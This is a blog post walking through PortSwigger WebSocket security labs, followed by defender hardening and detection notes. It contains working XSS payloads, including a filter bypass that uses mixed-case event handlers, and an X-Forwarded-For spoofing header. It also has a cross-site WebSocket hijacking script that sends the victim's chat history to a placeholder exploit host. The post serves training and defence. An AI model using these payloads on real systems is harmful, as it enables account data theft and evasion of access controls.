---
layout: post
title: "WebSocket Security Starts at the Handshake"
date: 2026-06-23 09:30:00 +0800
categories: [web-security, methodology, detection-engineering]
tags: [websocket, cswsh, xss, portswigger]
related_posts:
  - csrf-tokens-do-not-prove-user-intent
  - xss-is-a-parser-boundary-problem
  - authorization-is-not-a-route-name
---

WebSockets are not outside the web security model. They start as HTTP, carry cookies, and then become a long-lived message channel.

The three PortSwigger WebSocket labs split the problem cleanly:

- message validation;
- cross-site WebSocket hijacking;
- handshake manipulation.

## Client-side escaping is not validation

In the first lab, the browser client encodes dangerous characters before sending chat messages. Intercept the WebSocket frame and send the raw payload:

```html
<img src=1 onerror='alert(1)'>
```

The support agent renders it. The failure is familiar: the server trusted a client-side transformation.

## Cross-site WebSocket hijacking is CSRF for sockets

If a WebSocket handshake relies only on cookies and does not validate Origin or a token, an attacker page can open the victim's authenticated socket:

```js
var ws = new WebSocket('wss://LAB/chat');
ws.onopen = function() {
  ws.send('READY');
};
ws.onmessage = function(event) {
  fetch('https://EXPLOIT/log?m=' + encodeURIComponent(event.data), {mode: 'no-cors'});
};
```

The `READY` command returns chat history. Official walkthroughs often use Collaborator for collection, but an exploit-server access log can receive the same data via query string.

## The handshake is still HTTP

The third lab uses a flawed filter and IP block. The handshake can be manipulated with HTTP headers:

```http
X-Forwarded-For: 1.1.1.1
```

Then the message payload bypasses the filter with alternate casing and template literal syntax:

```html
<img src=1 oNeRrOr=alert`1`>
```

This is the key habit: inspect both the handshake and the frame stream.

## Defender notes

Hardening:

- validate Origin on WebSocket handshakes;
- require a CSRF or one-time WebSocket token for authenticated sockets;
- bind sockets to the authenticated user server-side;
- validate message schema server-side;
- encode output at the render sink;
- trust `X-Forwarded-For` only from known proxies;
- minimize history returned by default commands such as `READY`.

Detection:

- unexpected Origin values on `/chat` handshakes;
- frames containing HTML tags, event handlers, or script URLs;
- repeated handshakes with changing `X-Forwarded-For`;
- cross-origin pages opening a socket and immediately sending `READY`;
- support/admin browsers rendering chat messages as HTML.

The durable rule is that a WebSocket has two attack surfaces: the HTTP handshake and the message protocol. Secure both.
